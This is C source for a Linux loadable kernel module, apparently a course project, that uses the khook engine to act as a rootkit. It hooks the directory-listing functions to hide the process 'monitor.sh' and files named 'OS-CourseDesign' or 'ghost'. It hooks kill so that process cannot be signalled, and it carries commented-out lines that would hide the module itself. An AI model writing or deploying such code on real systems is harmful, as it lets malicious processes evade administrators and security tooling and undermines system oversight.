#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include "khook/engine.c"
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/init.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/compiler_types.h>



#define FLAG 0x80000000
const char *protected = "monitor.sh";
const char *hide = "monitor.sh";
int hidden_pid=-1;
int protected_pid=-1;

// static int adore_atoi(const char *str)
// {
//         int ret = 0, mul = 1;
//         const char *ptr;
//         for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
//         ptr--;
//         while (ptr >= str) {
//                 if (*ptr < '0' || *ptr > '9')
//                         break;
//                 ret += (*ptr - '0') * mul;
//                 mul *= 10;
// 		ptr--;   
//         }
//         return ret;
// }

static int print_pid(void)
{
	struct task_struct * task, * p;
	struct list_head * pos;
	int count = 0;
	printk("Hello World enter begin:\n");
	task =& init_task;
	list_for_each(pos, &task->tasks)
	{
		p = list_entry(pos, struct task_struct, tasks);
		count++;
		printk("%d---------->%s\n", p->pid, p->comm);
	}
	printk("the number of process is: %d\n", count);
	return 0;
}

static int find_pid(const char *victim)
{
	struct task_struct * task, * p;
	struct list_head * pos;
	int count = 0;
	task =& init_task;
	list_for_each(pos, &task->tasks)
	{
		p = list_entry(pos, struct task_struct, tasks);
		count++;
		if (strstr(p->comm, victim))
			return p->pid;
	}
	return 0;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	hidden_pid=find_pid(hide);
	pid = simple_strtol(name, &endp, 10);
	if (pid!=hidden_pid && !strstr(name, "OS-CourseDesign"))
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	hidden_pid=find_pid(hide);
	pid = simple_strtol(name, &endp, 10);
	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	hidden_pid=find_pid(hide);
	pid = simple_strtol(name, &endp, 10);
	if (pid != hidden_pid && !strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	hidden_pid=find_pid(hide);
	pid = simple_strtol(name, &endp, 10);
	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	hidden_pid=find_pid(hide);
	pid = simple_strtol(name, &endp, 10);
	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}
#endif



KHOOK_EXT(long, sys_kill, pid_t, int);
static long khook_sys_kill(pid_t pid, int sig) {
	int ret = 0;
	protected_pid=find_pid(protected);
	printk("pid:%d", protected_pid);
	if (protected_pid != pid)
		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
	return ret;
}


int init_module(void)
{
	print_pid();
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
	return khook_init();
}

void cleanup_module(void)
{
	khook_cleanup();
}

MODULE_LICENSE("GPL");
